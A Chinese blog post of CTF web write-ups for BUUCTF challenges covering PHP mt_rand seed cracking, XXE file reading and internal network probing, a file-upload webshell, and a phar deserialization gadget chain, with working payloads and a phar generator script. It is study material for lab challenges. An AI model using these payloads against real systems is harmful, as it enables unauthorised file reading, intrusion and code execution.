<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.openwall.com&#x2F;php_mt_seed&#x2F;</span><br><span class="line">下载后进入虚拟机Kali或者linux都行，然后需要确保php版本大于7.1好像</span><br><span class="line">然后进去看readme   make</span><br></pre></td></tr></table></figure>

<p>利用脚本跑出一些内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str1 &#x3D; &#39;Hg11vtADEm&#39;</span><br><span class="line">str2 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line">result &#x3D; &#39;&#39;</span><br><span class="line"></span><br><span class="line">length &#x3D; str(len(str2)-1)</span><br><span class="line">for i in range(0, len(str1)):</span><br><span class="line">    for j in range(0, len(str2)):</span><br><span class="line">        if str1[i] &#x3D;&#x3D; str2[j]:</span><br><span class="line">            result +&#x3D; str(j) + &#39; &#39; + str(j) + &#39; &#39; + \</span><br><span class="line">                &#39;0&#39; + &#39; &#39; + length + &#39; &#39;</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>利用工具爆破种子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;php_mt_seed 上面脚本跑出的内容</span><br></pre></td></tr></table></figure>



<p>得到种子</p>
<p>通过伪随机种子跑数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(348806110);</span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">echo $str;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hg11vtADEmUp4N0TS2rS</span><br></pre></td></tr></table></figure>

<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">XML 指可扩展标记语言（EXtensible Markup Language）。</span><br><span class="line">XML 的设计宗旨是传输数据，而不是显示数据。</span><br><span class="line">XML 是 W3C 的推荐标准。</span><br><span class="line">XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</span><br><span class="line">XML 语言没有预定义的标签。</span><br></pre></td></tr></table></figure>



<p>PHP引用外部实体，<strong>常见的利用协议</strong>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;文件绝对路径 如：file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;file.txt</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;xxx.php</span><br></pre></td></tr></table></figure>

<p><em>参数实体+外部实体</em></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&#x2F;URL&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>参数实体+外部实体示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">  %file;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><code>%file</code>(参数实体)是在DTD中被引用的，而<code>&amp;file;</code>是在xml文档中被引用的。</p>
<p>eg</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;d:&#x2F;&#x2F;qwzf.txt&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;file;&lt;&#x2F;name&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>

<p>参考链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6887#toc-4</span><br></pre></td></tr></table></figure>



<p>直接尝试读取flag</p>


<p>难道不能出明文试试加密后</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot; &gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>



<p>这时候犯了个错没有看路由访问应该访问doLogin.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xee [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;doLogin.php&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;file&lt;&#x2F;username&gt;&lt;password&gt;pass&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>

<p>但访问还是出错这时候就不对劲了，仔细一看，&amp;file没有加分号</p>
<p>一加就成功了</p>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$USERNAME &#x3D; &#39;admin&#39;; &#x2F;&#x2F;账号</span><br><span class="line">$PASSWORD &#x3D; &#39;024b87931a03f738fff6693ce0a78c88&#39;; &#x2F;&#x2F;密码</span><br><span class="line">这密码猜一下应该是md5，但解密需要钱</span><br><span class="line">$result &#x3D; null;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(false);</span><br><span class="line">$xmlfile &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);</span><br><span class="line"></span><br><span class="line">try&#123;</span><br><span class="line">	$dom &#x3D; new DOMDocument();</span><br><span class="line">	$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	$creds &#x3D; simplexml_import_dom($dom);</span><br><span class="line"></span><br><span class="line">	$username &#x3D; $creds-&gt;username;</span><br><span class="line">	$password &#x3D; $creds-&gt;password;</span><br><span class="line"></span><br><span class="line">	if($username &#x3D;&#x3D; $USERNAME &amp;&amp; $password &#x3D;&#x3D; $PASSWORD)&#123;</span><br><span class="line">		$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,1,$username);</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,0,$username);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;catch(Exception $e)&#123;</span><br><span class="line">	$result &#x3D; sprintf(&quot;&lt;result&gt;&lt;code&gt;%d&lt;&#x2F;code&gt;&lt;msg&gt;%s&lt;&#x2F;msg&gt;&lt;&#x2F;result&gt;&quot;,3,$e-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(&#39;Content-Type: text&#x2F;html; charset&#x3D;utf-8&#39;);</span><br><span class="line">echo $result;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这个代码没看出什么，就看出了是一个XEE漏洞，但至少看出来了，不用加密度，直接file协议</p>
<h3 id="XEETIPS"><a href="#XEETIPS" class="headerlink" title="XEETIPS"></a>XEETIPS</h3><p>xxe可以内网探测存活的主机，获取/etc/hosts文件，我们分别读取关键文件：**/etc/hosts 和 /proc/net/arp：**</p>




<p>真的存在别的ip</p>
<p>利用http协议读</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xee [</span><br><span class="line"> &lt;!ENTITY file SYSTEM &quot;http:&#x2F;&#x2F;10.128.253.12&quot;&gt;</span><br><span class="line"> ]&gt;</span><br></pre></td></tr></table></figure>



<p>发现报错</p>
<p>在学一个命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;&#x2F;proc&#x2F;net&#x2F;fib_trie</span><br></pre></td></tr></table></figure>



<p>buu访问巨慢，还有限制，然后爆破不出网段来</p>
<h2 id="WUSTCTF2020-CV-Maker"><a href="#WUSTCTF2020-CV-Maker" class="headerlink" title="[WUSTCTF2020]CV Maker"></a>[WUSTCTF2020]CV Maker</h2><p>F12没看出什么，有注册框，注册后登录</p>
<p>进来之后有个上传点，难道是图片上传</p>


<p>但一点击就弹窗提示先登录，感觉有点不对劲并且有报错</p>


<p>虽然但是还是可以传入图片，抓包修改</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传入png图片，抓包修改为php</span><br></pre></td></tr></table></figure>











<p>有路径，直接访问发现上传成功</p>
<p>掏出蚁剑大宝贝</p>
<p>我还以为有disable_function但实际上没有直接读取flag</p>
<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>上来就是一个登录框，有注册功能先注册下</p>


<p>发现上传点，思路明确先试试</p>
<p>但抓包修改后，发现传上去的内容名称后缀没有改变</p>


<p>那试试.htacess</p>
<p>但直接就提示</p>


<p>这就离谱了，看来实际的上传思路不能够实现，但这里既然能下载上传的文件是不是有可能泄露或者直接读取内容呢</p>
<p>点击下载抓包，卧槽好像还真的能行</p>


<p>那是不是直接读flag，但这里遇到的问题就是flag的文件名是什么，试了十几次之后没回显，先看看源码</p>
<p>首先可以明确存在三个页面</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login  register index</span><br></pre></td></tr></table></figure>



<p>前面两个Php代码都很常规，Index中发现一个新的php文件</p>
<p>代码挺长的144行的干货，先找漏洞点再逆向看</p>


<p>首先看到一个读取的</p>
<p>回溯到User类其中，摧毁的时候会触发</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct() &#123;</span><br><span class="line">    $this-&gt;db-&gt;close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们需要在File类中控制filename，并且这个db需要变成File类，这个好像都可以用序列化解决,但我们序列化完怎么反序列化执行呢，这时候用到了phar</p>
<h3 id="PHAR"><a href="#PHAR" class="headerlink" title="PHAR"></a>PHAR</h3><p>phar的本质是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p>
<p>php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化</p>
<p>本地生成phar文件需要注意</p>


<p>在php.ini中将phar.readonly设置为Off,并且去掉前面的分号</p>
<p>但VSCODE中一直报错，直接cmd命令行运行可以得到</p>


<ol>
<li><p>制作，按格式写好php后运行即可，如放在PHPstudy网站根目录然后去访问，即可得到我们的phar.phar文件。<br>注意 ：将php.ini文件中的phar.readonly 必须设置为 0 ，记得把前面的注释符 <code>;</code> 去掉。</p>
</li>
<li><p>然后可以给文件任意改名字和后缀都不会影响效果。</p>
</li>
<li><p>利用phar://的条件：</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1）phar文件要能够上传至服务器</span><br><span class="line"></span><br><span class="line">2）要有可用的魔术方法为跳板</span><br><span class="line"></span><br><span class="line">3）文件操作函数的参数可控（即有那些特定的函数如本题的file_get_contents函数），且:、&#x2F;、phar等特殊字符没有被过滤</span><br></pre></td></tr></table></figure>

<h4 id="如果过滤了phar怎么办呢？"><a href="#如果过滤了phar怎么办呢？" class="headerlink" title="如果过滤了phar怎么办呢？"></a>如果过滤了phar怎么办呢？</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有以下几种方法可以绕过：</span><br><span class="line"></span><br><span class="line">compress.bzip2:&#x2F;&#x2F;phar:&#x2F;&#x2F;</span><br><span class="line">compress.zlib:&#x2F;&#x2F;phar:&#x2F;&#x2F;&#x2F;</span><br><span class="line">php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;phar:&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>

<h4 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h4><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是__HALT_COMPILER();?&gt;这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    $phar &#x3D; new Phar(&#39;phar.phar&#39;);</span><br><span class="line">    $phar -&gt; startBuffering();</span><br><span class="line">    $phar -&gt; setStub(&#39;GIF89a&#39;.&#39;&lt;?php __HALT_COMPILER();?&gt;&#39;);   &#x2F;&#x2F;设置stub，增加gif文件头</span><br><span class="line">    $phar -&gt;addFromString(&#39;test.txt&#39;,&#39;test&#39;);  &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    $object &#x3D; new TestObject();</span><br><span class="line">    $object -&gt; data &#x3D; &#39;hu3sky&#39;;</span><br><span class="line">    $phar -&gt; setMetadata($object);  &#x2F;&#x2F;将自定义meta-data存入manifest</span><br><span class="line">    $phar -&gt; stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>此时我们就可以进行正常的序列化了，但发现我们缺少了一个回显，我们file_get_contents后无法回显读取的内容，这时候观察FileList类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">class FileList &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    private $results;</span><br><span class="line">    private $funcs;</span><br><span class="line"></span><br><span class="line">    public function __construct($path) &#123;</span><br><span class="line">        $this-&gt;files &#x3D; array();</span><br><span class="line">        $this-&gt;results &#x3D; array();</span><br><span class="line">        $this-&gt;funcs &#x3D; array();</span><br><span class="line">        $filenames &#x3D; scandir($path);</span><br><span class="line"></span><br><span class="line">        $key &#x3D; array_search(&quot;.&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line">        $key &#x3D; array_search(&quot;..&quot;, $filenames);</span><br><span class="line">        unset($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        foreach ($filenames as $filename) &#123;</span><br><span class="line">            $file &#x3D; new File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push($this-&gt;files, $file);</span><br><span class="line">            $this-&gt;results[$file-&gt;name()] &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($func, $args) &#123;</span><br><span class="line">        array_push($this-&gt;funcs, $func);</span><br><span class="line">        foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">            $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $table &#x3D; &#39;&lt;div id&#x3D;&quot;container&quot; class&#x3D;&quot;container&quot;&gt;&lt;div class&#x3D;&quot;table-responsive&quot;&gt;&lt;table id&#x3D;&quot;table&quot; class&#x3D;&quot;table table-bordered table-hover sm-font&quot;&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;thead&gt;&lt;tr&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($func) . &#39;&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .&#x3D; &#39;&lt;th scope&#x3D;&quot;col&quot; class&#x3D;&quot;text-center&quot;&gt;Opt&lt;&#x2F;th&gt;&#39;;</span><br><span class="line">        $table .&#x3D; &#39;&lt;&#x2F;thead&gt;&lt;tbody&gt;&#39;;</span><br><span class="line">        foreach ($this-&gt;results as $filename &#x3D;&gt; $result) &#123;</span><br><span class="line">            $table .&#x3D; &#39;&lt;tr&gt;&#39;;</span><br><span class="line">            foreach ($result as $func &#x3D;&gt; $value) &#123;</span><br><span class="line">                $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot;&gt;&#39; . htmlentities($value) . &#39;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .&#x3D; &#39;&lt;td class&#x3D;&quot;text-center&quot; filename&#x3D;&quot;&#39; . htmlentities($filename) . &#39;&quot;&gt;&lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;download&quot;&gt;下载&lt;&#x2F;a&gt; &#x2F; &lt;a href&#x3D;&quot;#&quot; class&#x3D;&quot;delete&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;&#39;;</span><br><span class="line">            $table .&#x3D; &#39;&lt;&#x2F;tr&gt;&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里存在一个回显</p>


<p>但我们如果跳入FileList中要如何调用File的close呢，这时候发现FileList中的__call存在一个写法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public function __call($func, $args) &#123;</span><br><span class="line">    array_push($this-&gt;funcs, $func);</span><br><span class="line">    foreach ($this-&gt;files as $file) &#123;</span><br><span class="line">        $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>它会调用便利$file的func即$file中的所有方法，那么并且配合上__destruct那么就可以达到回显的目的</p>
<p>调用链条</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User的destruct方法(其中db为new FileList)--&gt;FileList的call方法（因为FileList中不存在close所有调用call）--&gt;遍历到File的close得到信息--&gt;FileList的destruct方法得到回显</span><br></pre></td></tr></table></figure>

<p>phar脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class User &#123;</span><br><span class="line">        public $db;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    class File &#123;</span><br><span class="line">        public $filename;</span><br><span class="line">    &#125;</span><br><span class="line">    class FileList &#123;</span><br><span class="line">        private $files;</span><br><span class="line">        private $results;</span><br><span class="line">        private $funcs;</span><br><span class="line">    </span><br><span class="line">        public function __construct() &#123;</span><br><span class="line">            $file &#x3D; new File();</span><br><span class="line">            $file-&gt;filename &#x3D; &#39;&#x2F;flag.txt&#39;;</span><br><span class="line">            $this-&gt;files &#x3D; array($file);</span><br><span class="line">            $this-&gt;results &#x3D; array();</span><br><span class="line">            $this-&gt;funcs &#x3D; array();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar &#x3D; new Phar(&quot;phar.phar&quot;); &#x2F;&#x2F;后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); &#x2F;&#x2F;设置stub</span><br><span class="line"></span><br><span class="line">    $o &#x3D; new User();</span><br><span class="line">    $o -&gt; db&#x3D;new FileList();</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    $phar-&gt;setMetadata($o); &#x2F;&#x2F;将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); &#x2F;&#x2F;添加要压缩的文件</span><br><span class="line">    &#x2F;&#x2F;签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到phar文件后修改后缀为白名单后上传利用phar协议读取即反序列化</p>


<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>存在登录和注册，但注册一直报错有错误字符</p>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">墨水彩笔</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/12/18/WEB-BUU%E7%AC%AC%E4%B8%89%E9%A1%B5/">http://example.com/2022/12/18/WEB-BUU%E7%AC%AC%E4%B8%89%E9%A1%B5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/01/04/%E5%88%9D%E8%AF%86%E5%85%8D%E6%9D%80/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">初识免杀</div></div></a></div><div class="next-post pull-right"><a href="/2022/12/10/%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">绕过思路</div></div></a></div></nav></article></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 墨水彩笔</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><section id="rightside"><div id="rightside-config-hide"><button id="readmode" 